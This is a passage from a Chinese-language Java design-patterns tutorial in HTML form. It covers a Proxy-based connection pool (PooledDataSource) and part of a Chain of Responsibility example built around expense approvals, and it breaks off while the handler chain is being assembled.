&lt;p>空闲队列由&lt;code>PooledDataSource&lt;/code>负责维护：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PooledDataSource&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">DataSource&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 维护一个空闲队列:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Queue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">PooledConnectionProxy&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ArrayBlockingQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">PooledDataSource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 首先试图获取一个空闲连接:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">PooledConnectionProxy&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">poll&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 没有空闲连接时，打开一个新连接:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">openNewConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Return pooled connection: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">PooledConnectionProxy&lt;/span> &lt;span style="color:#75af00">openNewConnection&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">SQLException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">DriverManager&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Open new connection: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PooledConnectionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">idleQueue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们执行调用方代码，输出如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>Open new connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa
Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa
Return pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa
Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa
Return pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfa
Fake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa
&lt;/code>&lt;/pre>&lt;p>除了第一次打开了一个真正的JDBC Connection，后续获取的&lt;code>Connection&lt;/code>实际上是同一个JDBC Connection。但是，对于调用方来说，完全不需要知道底层做了哪些优化。&lt;/p>
&lt;p>我们实际使用的DataSource，例如HikariCP，都是基于代理模式实现的，原理同上，但增加了更多的如动态伸缩的功能（一个连接空闲一段时间后自动关闭）&lt;/p>
&lt;p>*与装饰器的区别：&lt;/p>
&lt;p>Decorator模式让调用者自己创建核心类，然后组合各种功能，而Proxy模式决不能让调用者自己创建再组合，否则就失去了代理的功能。Proxy模式让调用者认为获取到的是核心类接口，但实际上是代理类。&lt;/p>
&lt;h2 id="行为型模式">行为型模式&lt;/h2>
&lt;p>行为型模式主要涉及算法和对象间的职责分配。通过使用对象组合，行为型模式可以描述一组对象应该如何协作来完成一个整体任务。&lt;/p>
&lt;h3 id="责任链chain-of-responsibility">责任链Chain of Responsibility&lt;/h3>
&lt;p>是一种处理请求的模式，它让多个处理器都有机会处理该请求，直到其中某个处理成功为止。责任链模式把多个处理器串成链，然后让请求在链上传递（比如web中的Filter就是典型的责任链）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903135616160.png" alt="image-20220903135616160">&lt;/p>
&lt;p>举例：财务审批，假设某个员工需要报销一笔费用，审核者可以分为：&lt;/p>
&lt;ul>
&lt;li>Manager：只能审核1000元以下的报销；&lt;/li>
&lt;li>Director：只能审核10000元以下的报销；&lt;/li>
&lt;li>CEO：可以审核任意额度。&lt;/li>
&lt;/ul>
&lt;p>用责任链模式设计此报销流程时，每个审核者只关心自己责任范围内的请求，并且处理它。对于超出自己责任范围的，扔给下一个审核者处理，这样，将来继续添加审核者的时候，不用改动现有逻辑&lt;/p>
&lt;p>首先，我们要抽象出请求对象，它将在责任链上传递：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Request&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">amount&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#111">amount&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">amount&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">amount&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span> &lt;span style="color:#75af00">getAmount&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">amount&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其次，我们要抽象出处理器：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 返回Boolean.TRUE = 成功
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 返回Boolean.FALSE = 拒绝
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 返回null = 交下一个处理
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Boolean&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Request&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>并且做好约定：如果返回&lt;code>Boolean.TRUE&lt;/code>，表示处理成功，如果返回&lt;code>Boolean.FALSE&lt;/code>，表示处理失败（请求被拒绝），如果返回&lt;code>null&lt;/code>，则交由下一个&lt;code>Handler&lt;/code>处理。&lt;/p>
&lt;p>然后，依次编写ManagerHandler、DirectorHandler和CEOHandler。以ManagerHandler为例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ManagerHandler&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Handler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Boolean&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Request&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果超过1000元，处理不了，交下一个处理:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAmount&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 对Bob有偏见:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有了不同的&lt;code>Handler&lt;/code>后，我们还要把这些&lt;code>Handler&lt;/code>组合起来，变成一个链，并通过一个统一入口处理：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HandlerChain&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 持有所有Handler:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Handler&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">handlers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Handler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Request&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 依次调用每个Handler:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Handler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Boolean&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果返回TRUE或FALSE，处理结束:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#d88200">&amp;#34;Approved by &amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Denied by &amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Could not handle request: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在，我们就可以在客户端组装出责任链，然后用责任链来处理请求：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 构造责任链:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">HandlerChain&lt;/span> &lt;span style="color:#111">chain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HandlerChain&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ManagerHandler&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">chain&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DirectorHandler&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
